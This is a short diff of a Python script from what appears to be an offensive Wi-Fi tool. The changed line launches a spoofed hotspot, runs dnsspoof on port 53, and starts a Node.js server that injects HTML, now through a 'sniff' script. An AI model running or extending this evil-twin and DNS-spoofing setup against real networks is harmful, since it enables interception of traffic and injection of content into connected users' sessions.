@@ -311,7 +311,7 @@ for line in p.stdout.read().splitlines():
     if debug: 
         print("[DEBUG]"+line.decode("utf-8"))
 
-p = Popen("sh /home/pi/HackOTG/hotspot_start.sh "+spoof_essid+" && sudo dnsspoof -i wlan0 port 53 1>/dev/null 2>/dev/null& && nodejs serve_inject_spoof.js tmp/SERVE/ tmp/inject.html", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+p = Popen("sh /home/pi/HackOTG/hotspot_start.sh "+spoof_essid+" && sudo dnsspoof -i wlan0 port 53 1>/dev/null 2>/dev/null& nodejs serve_inject_sniff.js tmp/SERVE/ tmp/inject.html", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
 for line in iter(p.stdout.readline, ""):
         print('\r'+line[:-1].decode("utf-8"))
 
